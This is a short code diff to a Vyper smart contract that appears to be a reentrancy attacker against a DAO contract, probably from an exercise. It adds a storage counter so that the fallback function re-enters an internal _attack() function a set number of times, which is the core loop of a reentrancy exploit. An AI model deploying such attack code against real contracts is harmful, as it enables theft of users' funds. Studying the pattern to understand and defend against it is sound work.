@@ -13,6 +13,7 @@ def __init__():
     self.dao_address = ZERO_ADDRESS
     self.owner_address = ZERO_ADDRESS
     self.dao_contract = DAO(self.dao_address)
+    self.counter = 0
 
 @internal
 def _attack() -> bool:
@@ -53,7 +54,7 @@ def __default__():
     # NEED SOME KIND OF COUNTER
     # NOT GOING TO DEPOSIT ANYTHING, KNOW THE DAO ADDRESS
     # USE INTERNAL ATTACK FUNCTION
-    if counter < 2:
+    if self.counter < 2:
         self._attack()  
-        counter = counter + 1  
+        self.counter = self.counter + 1  
                        
